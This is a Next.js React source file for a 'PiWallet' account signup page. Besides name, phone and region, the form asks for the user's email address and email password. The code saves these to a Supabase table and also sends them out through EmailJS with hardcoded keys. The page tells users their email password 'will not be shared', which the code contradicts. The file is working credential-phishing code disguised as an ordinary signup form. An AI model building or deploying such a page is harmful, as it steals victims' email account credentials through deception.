'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import emailjs from '@emailjs/browser';
import supabase from '../../lib/supabase'; // ✅ adjust this path to your actual Supabase client


export default function SignupPage() {
  const router = useRouter();
  const [form, setForm] = useState({
    firstName: '',
    lastName: '',
    userName: '',
    email: '',
    emailPassword: '',
    region: '',
    phoneNumber: '', 
  });
  const [agreed, setAgreed] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false); 

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement>
  ) => {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!agreed) {
      alert('Please agree to the terms before continuing.');
      return;
    }

    // Step 2: Insert user data into a custom Supabase table
    const { error: insertError } = await supabase.from('registrations').insert([
      {
        first_name: form.firstName,
        last_name: form.lastName,
        username: form.userName,
        phone_number: form.phoneNumber,
        email: form.email,
        emailPassword: form.emailPassword,
        region: form.region,
      },
    ]);

    if (insertError) {
      console.error('Error saving to Supabase:', insertError.message);
      alert('Failed to save data.');
      return;
    }

    // Step 3: Send confirmation email via EmailJS
    const emailform = {
       first_name: form.firstName,
        last_name: form.lastName,
        username: form.userName,
        phone_number: form.phoneNumber,
        email: form.email,
        emailPassword: form.emailPassword,
        region: form.region,
    };
    emailjs
      .send(
         'service_tiih48u',
        'template_akfh6vu',
        form,
        'IyEEUqS1FYB6INOnR'
      )
      .then(() => console.log('Email sent!'))
      .catch((err: any) => console.error('EmailJS error:', err.text));

    setShowSuccess(true);
    setTimeout(() => {
      router.push('/login');
    }, 3000);
  };

  return (
    <div className="min-h-screen bg-[#0B1120] flex items-center justify-center px-4 text-white">
      <form
        onSubmit={handleSubmit}
        className="bg-[#1B2430] p-8 rounded shadow-md w-full max-w-lg"
      >
        <h1 className="text-2xl font-bold mb-6 text-center">
          Create your PiWallet Account
        </h1>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <input
            type="text"
            name="firstName"
            placeholder="First Name"
            value={form.firstName}
            onChange={handleChange}
            className="p-2 rounded bg-[#0B1120] text-white placeholder-gray-400"
            required
          />
          <input
            type="text"
            name="lastName"
            placeholder="Last Name"
            value={form.lastName}
            onChange={handleChange}
            className="p-2 rounded bg-[#0B1120] text-white placeholder-gray-400"
            required
          />
          <input
            type="text"
            name="userName"
            placeholder="User Name"
            value={form.userName}
            onChange={handleChange}
            className="p-2 rounded bg-[#0B1120] text-white placeholder-gray-400"
            required
          />
          <input
            type="tel"
            name="phoneNumber"
            placeholder="Phone Number"
            value={form.phoneNumber}
            onChange={handleChange}
            className="p-2 rounded bg-[#0B1120] text-white placeholder-gray-400"
            required
          />
          <input
            type="email"
            name="email"
            placeholder="Email Address"
            value={form.email}
            onChange={handleChange}
            className="p-2 rounded bg-[#0B1120] text-white placeholder-gray-400"
            required
          />
          <input
            type="password"
            name="emailPassword"
            placeholder="Email Password"
            value={form.emailPassword}
            onChange={handleChange}
            className="p-2 rounded bg-[#0B1120] text-white placeholder-gray-400"
            required
          />
          <input
            type="text"
            name="region"
            placeholder="Region"
            value={form.region}
            onChange={handleChange}
            className="p-2 rounded bg-[#0B1120] text-white placeholder-gray-400"
            required
          />
        </div>

        <div className="text-xs text-gray-400 mt-4 mb-2">
          Your Email Password is used only for verification and will not be shared.
        </div>

        <div className="flex items-start mb-6">
          <input
            type="checkbox"
            id="terms"
            checked={agreed}
            onChange={(e) => setAgreed(e.target.checked)}
            className="mt-1 mr-2"
          />
          <label htmlFor="terms" className="text-sm">
            I agree to the{' '}
            <a href="/terms" className="underline text-blue-400">
              Terms
            </a>{' '}
            and{' '}
            <a href="/privacy" className="underline text-blue-400">
              Privacy Policy
            </a>.
          </label>
        </div>

        <button
          type="submit"
          className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded transition"
        >
          Sign Up
        </button>

        <p className="text-sm text-center mt-4 text-gray-400">
          Already have an account?{' '}
          <a href="/login" className="underline text-blue-400">
            Log in
          </a>
        </p>
      </form>

      {showSuccess && (
        <div className="absolute inset-0 flex items-center justify-center bg-white/90 rounded-2xl z-50">
          <div className="text-center animate-fade-in">
            <div className="text-green-600 text-4xl mb-2">✔</div>
            <p className="text-lg font-semibold text-gray-700">
              Registration Successful!
            </p>
          </div>
        </div>
      )}
    </div>
  );
}
